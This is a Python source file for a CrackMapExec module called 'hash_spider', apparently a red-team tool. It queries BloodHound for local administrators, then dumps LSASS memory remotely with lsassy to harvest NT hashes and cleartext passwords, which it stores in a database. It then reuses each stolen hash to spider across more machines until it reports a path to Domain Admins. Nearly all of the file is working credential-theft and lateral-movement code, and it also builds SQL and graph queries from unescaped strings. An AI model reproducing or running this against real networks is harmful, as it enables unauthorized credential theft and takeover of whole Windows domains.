#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Author:
# Peter Gormington @hackerm00n on Twitter

from sqlite3 import connect
from sys import exit
from neo4j import GraphDatabase, basic_auth
from neo4j.exceptions import AuthError, ServiceUnavailable
from lsassy import logger
from lsassy.dumper import Dumper
from lsassy.parser import Parser
from lsassy.session import Session
from lsassy.impacketfile import ImpacketFile


credentials_data = []
admin_results = []
found_users = []
reported_da = []

def neo4j_conn(context, connection, driver):
    if connection.config.get('BloodHound', 'bh_enabled') != "False":
        context.log.info("Connecting to Neo4j/Bloodhound.")
        try:
            session = driver.session()
            list(session.run("MATCH (g:Group) return g LIMIT 1"))
            context.log.info("Connection Successful!")
        except AuthError as e:
            context.log.error("Invalid credentials.")
        except ServiceUnavailable as e:
            context.log.error("Could not connect to neo4j database.")
        except Exception as e:
            context.log.error("Error querying domain admins")
            print(e)
    else:
        context.log.highlight("BloodHound not marked enabled. Check cme.conf")
        exit()

def neo4j_local_admins(context, driver):
    global admin_results
    try:
        session = driver.session()
        admins = session.run("MATCH (c:Computer) OPTIONAL MATCH (u1:User)-[:AdminTo]->(c) OPTIONAL MATCH (u2:User)-[:MemberOf*1..]->(:Group)-[:AdminTo]->(c) WITH COLLECT(u1) + COLLECT(u2) AS TempVar,c UNWIND TempVar AS Admins RETURN c.name AS COMPUTER, COUNT(DISTINCT(Admins)) AS ADMIN_COUNT,COLLECT(DISTINCT(Admins.name)) AS USERS ORDER BY ADMIN_COUNT DESC") # This query pulls all PCs and their local admins from Bloodhound. Based on: https://github.com/xenoscr/Useful-BloodHound-Queries/blob/master/List-Queries.md and other similar posts
        context.log.info("Admins and PCs obtained.")
    except Exception:
        context.log.error("Could not pull admins.")
        exit()
    admin_results = [record for record in admins.data()]

def create_db(local_admins, dbconnection, cursor):
    cursor.execute('''CREATE TABLE if not exists pc_and_admins ("pc_name" TEXT UNIQUE, "local_admins" TEXT, "dumped" TEXT)''')
    for result in local_admins:
        cursor.execute("INSERT OR IGNORE INTO pc_and_admins(pc_name, local_admins, dumped) VALUES(?, ?, ?)", (result.get('COMPUTER'),str(result.get('USERS'),),'FALSE'))
    dbconnection.commit()
    cursor.execute('''CREATE TABLE if not exists admin_users("username" TEXT UNIQUE, "hash" TEXT, "password" TEXT)''')
    admin_users = []
    for result in local_admins:
        for user in result.get('USERS'):
            if user not in admin_users:
                admin_users.append(user)
    for user in admin_users:
        cursor.execute('''INSERT OR IGNORE INTO admin_users(username) VALUES(?)''', [user])
    dbconnection.commit()

def process_creds(context, connection, credentials_data, dbconnection, cursor, driver):
    if connection.args.local_auth:
        context.log.extra['host'] = connection.conn.getServerDNSDomainName()
    else:
        context.log.extra['host'] = connection.domain
    context.log.extra['hostname'] = connection.host.upper()
    for result in credentials_data:
        username = result["username"].upper().split('@')[0]
        nthash = result["nthash"]
        password = result["password"]
        if result["password"] != None:
            context.log.highlight(f"Found a cleartext password for: {username}:{password}. Adding to the DB and marking user as owned in BH.")
            cursor.execute("UPDATE admin_users SET password = ? WHERE username LIKE '" + username + "%'", [password])
            username = (f"{username.upper()}@{context.log.extra['host'].upper()}")
            dbconnection.commit()
            session = driver.session()
            session.run('MATCH (u) WHERE (u.name = "' + username + '") SET u.owned=True RETURN u,u.name,u.owned')
        if nthash == 'aad3b435b51404eeaad3b435b51404ee' or nthash =='31d6cfe0d16ae931b73c59d7e0c089c0':
            context.log.error(f"Hash for {username} is expired.")
        elif username not in found_users and nthash != None:
            context.log.highlight(f"Found hashes for: '{username}:{nthash}'. Adding them to the DB and marking user as owned in BH.")
            found_users.append(username)
            cursor.execute("UPDATE admin_users SET hash = ? WHERE username LIKE '" + username + "%'", [nthash])
            dbconnection.commit()
            username = (f"{username.upper()}@{context.log.extra['host'].upper()}")
            session = driver.session()
            session.run('MATCH (u) WHERE (u.name = "' + username + '") SET u.owned=True RETURN u,u.name,u.owned')
            path_to_da = session.run("MATCH p=shortestPath((n)-[*1..]->(m)) WHERE n.owned=true AND m.name=~ '.*DOMAIN ADMINS.*' RETURN p")
            paths = [record for record in path_to_da.data()]
            for path in paths:
                if path:
                    for key,value in path.items():
                        for item in value:
                            if type(item) == dict:
                                if {item['name']} not in reported_da:
                                    context.log.success(f"You have a valid path to DA as {item['name']}.")
                                    reported_da.append({item['name']})
                                exit()

def initial_run(connection, cursor):
    username = connection.username
    password = getattr(connection, "password", "")
    nthash = getattr(connection, "nthash", "")
    cursor.execute("UPDATE admin_users SET password = ? WHERE username LIKE '" + username + "%'", [password])
    cursor.execute("UPDATE admin_users SET hash = ? WHERE username LIKE '" + username + "%'", [nthash])

class CMEModule:
    name = 'hash_spider'
    description = "Dump lsass recursively from a given hash using BH to find local admins"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """
            METHOD              Method to use to dump lsass.exe with lsassy
            RESET_DUMPED        Allows re-dumping of computers. (Default: False)
            RESET               Reset DB. (Default: False)
        """
        self.method = 'comsvcs'
        if 'METHOD' in module_options:
            self.method = module_options['METHOD']
        self.reset_dumped = module_options.get('RESET_DUMPED', False)
        self.reset = module_options.get('RESET', False)


    def run_lsassy(self, context, connection): # Couldn't figure out how to properly retrieve output from the module without editing. Blatantly ripped from lsassy_dump.py. Thanks pixis - @hackanddo!
        logger.init(quiet=True)
        host = connection.host
        domain_name = connection.domain
        username = connection.username
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")
        session = Session()
        session.get_session(
            address=host,
            target_ip=host,
            port=445,
            lmhash=lmhash,
            nthash=nthash,
            username=username,
            password=password,
            domain=domain_name
        )
        if session.smb_session is None:
            context.log.error("Couldn't connect to remote host. Password likely expired/changed. Removing from DB.")
            cursor.execute("UPDATE admin_users SET hash = NULL WHERE username LIKE '" + username + "'")
            return False
        dumper = Dumper(session, timeout=10, time_between_commands=7).load(self.method)
        if dumper is None:
            context.log.error("Unable to load dump method '{}'".format(self.method))
            return False
        file = dumper.dump()
        if file is None:
            context.log.error("Unable to dump lsass")
            return False
        credentials, tickets, masterkeys = Parser(file).parse()
        file.close()
        ImpacketFile.delete(session, file.get_file_path())
        if credentials is None:
            credentials = []
        credentials = [cred.get_object() for cred in credentials if not cred.get_username().endswith("$")]
        credentials_unique = []
        credentials_output = []
        for cred in credentials:
            if [cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"]] not in credentials_unique:
                credentials_unique.append([cred["domain"], cred["username"], cred["password"], cred["lmhash"], cred["nthash"]])
                credentials_output.append(cred)
        global credentials_data
        credentials_data = credentials_output

    def spider_pcs(self, context, connection, cursor, dbconnection, driver):
        cursor.execute("SELECT * from admin_users WHERE hash is not NULL")
        compromised_users = cursor.fetchall()
        cursor.execute("SELECT pc_name,local_admins FROM pc_and_admins WHERE dumped LIKE 'FALSE'")
        admin_access = cursor.fetchall()
        for user in compromised_users:
            for pc in admin_access:
                if user[0] in pc[1]:
                    cursor.execute(f"SELECT * FROM pc_and_admins WHERE pc_name = '{pc[0]}' AND dumped NOT LIKE 'TRUE'")
                    more_to_dump = cursor.fetchall()
                    if len(more_to_dump) > 0:
                        context.log.info(f"User {user[0]} has more access to {pc[0]}. Attempting to dump.")
                        connection.domain = user[0].split('@')[1]
                        setattr(connection, "host", pc[0].split('.')[0])
                        setattr(connection, "username", user[0].split('@')[0])
                        setattr(connection, "nthash", user[1])
                        setattr(connection, "nthash", user[1])
                        try:
                            self.run_lsassy(context, connection)
                            cursor.execute("UPDATE pc_and_admins SET dumped = 'TRUE' WHERE pc_name LIKE '" + pc[0] + "%'")

                            process_creds(context, connection, credentials_data, dbconnection, cursor, driver)
                            self.spider_pcs(context, connection, cursor, dbconnection, driver)
                        except Exception:
                            context.log.error(f"Failed to dump lsassy on {pc[0]}")
        if len(admin_access) > 0:
            context.log.error("No more local admin access known. Please try re-running Bloodhound with newly found accounts.")
            exit()
        
    def on_admin_login(self, context, connection):
        db_path = connection.config.get('CME', 'workspace')
        dbconnection = connect(db_path, check_same_thread=False, isolation_level=None) # Sqlite DB will be saved at ./CrackMapExec/default if name in cme.conf is default
        cursor = dbconnection.cursor()
        if self.reset != False:
            try:
                cursor.execute("DROP TABLE IF EXISTS admin_users;")
                cursor.execute("DROP TABLE IF EXISTS pc_and_admins;")
                context.log.info("Database reseted")
                exit()
            except Exception as e:
                context.log.error("Database reset error", str(e))
                exit

        if self.reset_dumped != False:
            try:
                cursor.execute("UPDATE pc_and_admins SET dumped = 'False'")
                context.log.info("PCs can be dumped again.")
            except Exception as e:
                context.log.error("Database update error", str(e))
                exit

        neo4j_user = connection.config.get('BloodHound', 'bh_user')
        neo4j_pass = connection.config.get('BloodHound', 'bh_pass')
        neo4j_uri = connection.config.get('BloodHound', 'bh_uri')
        neo4j_port = connection.config.get('BloodHound', 'bh_port')
        neo4j_db = "bolt://" + neo4j_uri + ":" + neo4j_port
        driver = GraphDatabase.driver(neo4j_db, auth = basic_auth(neo4j_user, neo4j_pass), encrypted=False)
        neo4j_conn(context, connection, driver)
        neo4j_local_admins(context, driver)
        create_db(admin_results, dbconnection, cursor)
        initial_run(connection, cursor)
        context.log.info("Running lsassy.")
        self.run_lsassy(context, connection)
        process_creds(context, connection, credentials_data, dbconnection, cursor, driver)
        context.log.info("🕷️ Starting to spider. 🕷️")
        self.spider_pcs(context, connection, cursor, dbconnection, driver)
